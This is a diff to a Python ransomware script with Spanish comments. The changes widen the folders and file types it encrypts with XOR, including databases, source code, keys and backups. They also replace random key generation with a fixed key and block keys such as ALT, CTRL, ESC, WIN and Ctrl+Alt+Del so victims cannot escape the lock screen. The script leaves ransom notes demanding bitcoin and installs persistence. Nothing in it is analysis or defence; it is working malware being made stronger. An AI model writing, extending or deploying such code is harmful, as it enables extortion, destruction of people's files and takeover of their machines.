@@ -11,6 +11,7 @@ import getpass
 from pathlib import Path
 import tkinter as tk
 from tkinter import messagebox
+import keyboard
 
 class RansomwarePersistente:
     def __init__(self):
@@ -18,7 +19,11 @@ class RansomwarePersistente:
             '~/Documents',
             '~/Downloads', 
             '~/Desktop',
-            '~/Pictures'
+            '~/Pictures',
+            '~/Videos',
+            '~/Music',
+            '~/OneDrive',
+            '~/Dropbox'
         ]
         self.excluded_dirs = [
             'Windows', 'Program Files', 'Program Files (x86)',
@@ -27,10 +32,14 @@ class RansomwarePersistente:
         self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
         self.price = 500
         self.encryption_count = 0
-        self.password = None
-        self.victim_id = None
+        
+        # CLAVE FIJA DE CIFRADO - SOLO PARA EL DESARROLLADOR
+        self.password = "D3m0_F1x3d_K3y_2024!"  # Esta clave solo la ves tú
+        self.victim_id = "VICTIM_" + ''.join(random.sample(string.ascii_uppercase + string.digits, 6))
+        
         self.script_path = os.path.abspath(__file__)
         self.window_open = False
+        self.keyboard_blocked = False
         
     def is_admin(self):
         try:
@@ -52,6 +61,45 @@ class RansomwarePersistente:
 ==================================================
 """
         print(banner)
+
+    def block_keyboard(self):
+        """Bloquea las teclas ALT, CTRL, ESC, etc."""
+        if self.keyboard_blocked:
+            return
+            
+        def block_keys():
+            try:
+                # Bloquear combinaciones de teclas comunes
+                keyboard.block_key('alt')
+                keyboard.block_key('ctrl')
+                keyboard.block_key('esc')
+                keyboard.block_key('win')
+                keyboard.block_key('tab')
+                keyboard.block_key('f4')
+                keyboard.block_key('alt+f4')
+                keyboard.block_key('ctrl+alt+del')
+                keyboard.block_key('ctrl+shift+esc')
+                keyboard.block_key('win+r')
+                keyboard.block_key('win+x')
+                keyboard.block_key('alt+tab')
+                keyboard.block_key('ctrl+esc')
+                
+                print("[+] Teclas bloqueadas: ALT, CTRL, ESC, WIN, TAB, F4, etc.")
+                self.keyboard_blocked = True
+            except Exception as e:
+                print(f"[-] Error bloqueando teclas: {e}")
+
+        # Ejecutar en un hilo separado
+        threading.Thread(target=block_keys, daemon=True).start()
+
+    def unblock_keyboard(self):
+        """Desbloquea todas las teclas"""
+        try:
+            keyboard.unblock_all_keys()
+            self.keyboard_blocked = False
+            print("[+] Teclas desbloqueadas")
+        except Exception as e:
+            print(f"[-] Error desbloqueando teclas: {e}")
 
     def install_persistence(self):
         """Instala multiples metodos de persistencia"""
@@ -144,23 +192,39 @@ class RansomwarePersistente:
 
     def should_encrypt(self, filepath):
         file_str = str(filepath).lower()
+        
+        # Excluir directorios del sistema
         for excluded in self.excluded_dirs:
             if excluded.lower() in file_str:
                 return False
+        
+        # Excluir archivos del sistema y archivos ya cifrados
+        if file_str.endswith('.encrypted') or 'windows' in file_str or 'system' in file_str:
+            return False
+            
         try:
-            if filepath.stat().st_size < 100 or filepath.stat().st_size > 100 * 1024 * 1024:  # 100MB max
+            # Tamaño entre 100 bytes y 50MB (aumentado el límite)
+            if filepath.stat().st_size < 100 or filepath.stat().st_size > 50 * 1024 * 1024:
                 return False
         except:
             return False
-        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png', '.zip', '.rar', '.mp3', '.mp4', '.avi']
+            
+        # EXTENSIONES MÁS AMPLIAS PARA CIFRAR MÁS ARCHIVOS
+        valid_extensions = [
+            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', '.svg',
+            '.zip', '.rar', '.7z', '.tar', '.gz',
+            '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
+            '.sql', '.mdb', '.accdb', '.db',
+            '.psd', '.ai', '.eps', '.indd',
+            '.cad', '.dwg', '.dxf',
+            '.html', '.htm', '.css', '.js', '.php',
+            '.cpp', '.c', '.h', '.java', '.py', '.rb', '.pl',
+            '.xml', '.json', '.csv',
+            '.key', '.pem', '.cer', '.crt',
+            '.backup', '.bak', '.old'
+        ]
         return any(file_str.endswith(ext) for ext in valid_extensions)
-
-    def generate_keys(self):
-        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
-        self.password = ''.join(random.sample(s, 20))
-        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 8))
-        print(f"[+] CLAVE GENERADA: {self.password}")
-        print(f"[+] ID VÍCTIMA: {self.victim_id}")
 
     def simple_encrypt(self, data, key):
         """Cifrado simple XOR con la clave"""
@@ -231,12 +295,15 @@ ADVERTENCIAS:
 * NO REINSTALE EL SISTEMA
 * NO INTENTE DESCIFRAR LOS ARCHIVOS MANUALMENTE
 
-Para recuperar sus archivos, ingrese la clave de descifrado:
+Para recuperar sus archivos, ingrese la clave de descifrado
+que recibirá después del pago.
 """
         locations = [
             os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
             os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
-            os.path.expanduser('~/Downloads/INSTRUCCIONES.txt')
+            os.path.expanduser('~/Downloads/INSTRUCCIONES.txt'),
+            os.path.expanduser('~/Pictures/LEAME.txt'),
+            os.path.expanduser('~/Videos/INSTRUCCIONES.txt')
         ]
         for location in locations:
             try:
@@ -246,14 +313,15 @@ Para recuperar sus archivos, ingrese la clave de descifrado:
             except:
                 pass
 
-        # Guardar credenciales localmente por si acaso
+        # Guardar credenciales localmente (solo para el desarrollador)
         try:
-            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
-                f.write(f"ID: {self.victim_id}\n")
-                f.write(f"PASSWORD: {self.password}\n")
-                f.write(f"BITCOIN: {self.bitcoin}\n")
-                f.write(f"PRICE: ${self.price}\n")
-            print("[+] Credenciales guardadas en CREDENCIALES_LOCALES.txt")
+            with open('CLAVE_MAESTRA.txt', 'w') as f:
+                f.write(f"=== CLAVE MAESTRA (SOLO DESARROLLADOR) ===\\n")
+                f.write(f"ID: {self.victim_id}\\n")
+                f.write(f"CLAVE DE DESCIFRADO: {self.password}\\n")
+                f.write(f"BITCOIN: {self.bitcoin}\\n")
+                f.write(f"PRECIO: ${self.price}\\n")
+            print("[+] Clave maestra guardada en CLAVE_MAESTRA.txt")
         except:
             pass
 
@@ -274,6 +342,8 @@ Para recuperar sus archivos, ingrese la clave de descifrado:
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.bind("<Escape>", lambda e: "break")
             root.bind("<Alt-F4>", lambda e: "break")
+            root.bind("<Control-q>", lambda e: "break")
+            root.bind("<Control-w>", lambda e: "break")
             
             # Frame principal
             main_frame = tk.Frame(root, bg="black")
@@ -292,7 +362,7 @@ Para recuperar sus archivos, ingrese la clave de descifrado:
             # Mensaje
             message_label = tk.Label(
                 main_frame,
-                text="Todos tus archivos han sido cifrados.\nPara recuperarlos debes pagar el rescate.",
+                text="Todos tus archivos han sido cifrados.\\nPara recuperarlos debes pagar el rescate.",
                 font=("Arial", 16),
                 fg="white",
                 bg="black"
@@ -305,7 +375,10 @@ ID VÍCTIMA: {self.victim_id}
 RESCATE: ${self.price} USD
 BITCOIN: {self.bitcoin}
 
-Ingrese la clave de descifrado si ya ha pagado:
+Contacte con el soporte para realizar el pago
+y recibir la clave de descifrado.
+
+Ingrese la clave de descifrado:
 """
             info_label = tk.Label(
                 main_frame,
@@ -347,7 +420,7 @@ Ingrese la clave de descifrado si ya ha pagado:
             # Advertencia
             warning_label = tk.Label(
                 main_frame,
-                text="ADVERTENCIA: No cierre esta ventana. El sistema se reiniciará automáticamente.",
+                text="ADVERTENCIA: Teclas ALT, CTRL, ESC BLOQUEADAS. No cierre esta ventana.",
                 font=("Arial", 10),
                 fg="orange",
                 bg="black"
@@ -356,6 +429,9 @@ Ingrese la clave de descifrado si ya ha pagado:
             
             # Vincular Enter
             password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
+            
+            # Bloquear teclado
+            self.block_keyboard()
             
             root.mainloop()
             
@@ -370,6 +446,7 @@ Ingrese la clave de descifrado si ya ha pagado:
             messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando descifrado...")
             root.destroy()
             self.window_open = False
+            self.unblock_keyboard()
             self.start_decryption()
         else:
             messagebox.showerror("ERROR", "Clave incorrecta. Sistema bloqueado.")
@@ -462,7 +539,7 @@ def main():
             print("[+] Archivo de startup removido")
         
         # Archivos temporales
-        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
+        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CLAVE_MAESTRA.txt"]
         for file in files_to_remove:
             if os.path.exists(file):
                 os.remove(file)
@@ -494,16 +571,16 @@ if __name__ == "__main__":
         print("[*] INICIANDO RANSOMWARE")
         print("=" * 40)
         
+        # MOSTRAR CLAVE SOLO AL DESARROLLADOR
+        print(f"[*] CLAVE MAESTRA (SOLO DESARROLLADOR): {self.password}")
+        print(f"[*] ID VÍCTIMA: {self.victim_id}")
+        
         # Verificar persistencia
         if not self.check_persistence():
             print("[*] Instalando persistencia...")
             self.install_persistence()
         else:
             print("[*] Persistencia ya instalada")
-
-        # Generar claves
-        print("[*] Generando claves...")
-        self.generate_keys()
 
         # Cifrar archivos
         print("[*] Cifrando archivos...")
@@ -520,11 +597,12 @@ if __name__ == "__main__":
         self.create_ransom_note()
 
         print(f"[+] COMPLETADO: {total_encrypted} archivos cifrados")
-        print(f"[+] CLAVE: {self.password}")
+        print(f"[+] CLAVE MAESTRA: {self.password}")  # Solo en consola
         print(f"[+] ID: {self.victim_id}")
         
-        # Mostrar ventana
+        # Mostrar ventana y bloquear teclado
         print("[*] Mostrando ventana de ransomware...")
+        print("[*] Bloqueando teclas ALT, CTRL, ESC...")
         self.show_ransomware_window()
 
 if __name__ == "__main__":
